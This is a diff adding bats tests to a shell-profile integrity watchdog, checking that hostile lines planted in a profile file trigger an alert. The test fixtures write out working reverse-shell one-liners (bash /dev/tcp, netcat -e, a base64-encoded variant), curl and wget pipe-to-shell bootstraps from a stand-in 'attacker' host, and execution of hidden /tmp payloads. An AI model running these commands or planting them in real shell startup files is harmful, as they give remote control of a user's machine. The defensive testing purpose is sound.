@@ -115,3 +115,85 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — shell-init inventory enumerates per-login exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell variant 1): /dev/tcp/<ip>/<port> bash reverse → alert" {
+    seed_benign
+    run_wd
+    printf 'bash -i >& /dev/tcp/192.168.0.1/1234 0>&1\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (reverse-shell variant 2): netcat reverse shell → alert" {
+    seed_benign
+    run_wd
+    printf 'nc 10.0.0.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-sh): the canonical attacker bootstrap pattern → alert" {
+    seed_benign
+    run_wd
+    printf 'curl http://attacker/script.sh | bash\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant → alert" {
+    seed_benign
+    run_wd
+    printf 'wget -qO- http://attacker/payload | sh\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): the obfuscation pattern → alert" {
+    # Common attacker obfuscation: base64-encoded payload piped
+    # to sh. Locks the pattern is in the denylist.
+    seed_benign
+    run_wd
+    printf 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d | bash\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (writable-tmp piped exec): `; /tmp/.dotted` after a command chain → alert" {
+    # The script's writable-location regex requires start-of-line
+    # OR after `;|&` whitespace — locks the "chained-after-command"
+    # case (e.g., `cmd1 && /tmp/.payload`) which is how an attacker
+    # piggybacks on an existing line.
+    seed_benign
+    run_wd
+    printf 'echo hello; /tmp/.bootstrap\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (writable-var-tmp exec): a /var/tmp exec → alert too" {
+    seed_benign
+    run_wd
+    printf '/var/tmp/.callback\n' > "${PROFILE_F}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-shell-init -- ')
+    [ "${main_count}" = "1" ]
+}
